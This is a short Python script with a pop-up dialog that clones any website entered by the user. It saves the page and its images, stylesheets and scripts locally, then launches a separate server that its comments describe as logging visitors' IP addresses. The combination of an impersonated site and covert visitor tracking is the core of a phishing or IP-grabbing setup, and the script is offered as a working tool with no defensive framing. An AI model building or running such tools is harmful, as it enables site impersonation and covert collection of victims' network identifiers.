import os  
import requests  
from bs4 import BeautifulSoup  
from urllib.parse import urljoin  
import tkinter as tk  
from tkinter import simpledialog, messagebox  
import subprocess  

def clone_site(url):
    response = requests.get(url)
    if response.status_code == 200:
        html_content = response.text  
        soup = BeautifulSoup(html_content, 'html.parser')

        # Save HTML file  
        with open('index.html', 'w', encoding='utf-8') as file:
            file.write(soup.prettify())

        # Create a directory for assets  
        os.makedirs('assets', exist_ok=True)

        # Find and download assets (images, CSS, etc.)
        for link in soup.find_all(['img', 'link', 'script']):
            asset_url = link.get('src') or link.get('href')
            if asset_url:
                asset_url = urljoin(url, asset_url)
                try:
                    asset_response = requests.get(asset_url)
                    asset_name = os.path.join('assets', os.path.basename(asset_url))
                    with open(asset_name, 'wb') as asset_file:
                        asset_file.write(asset_response.content)
                except Exception as e:
                    print(f"Failed to download {asset_url}: {e}")

        print("Website cloned successfully.")
        messagebox.showinfo("Success", "Website cloned successfully.")

        # Start the server to log IP addresses  
        subprocess.Popen(['python3', 'server.py'])  # Start the IP logging server  
    else:
        print(f"Failed to retrieve the website. Status code: {response.status_code}")
        messagebox.showerror("Error", f"Failed to retrieve the website. Status code: {response.status_code}")

def run_gui():
    root = tk.Tk()
    root.withdraw()  # Hide the main window

    url = simpledialog.askstring("Input", "Enter the URL of the website to clone:")
    if url:
        clone_site(url)

if __name__ == "__main__":
    run_gui()
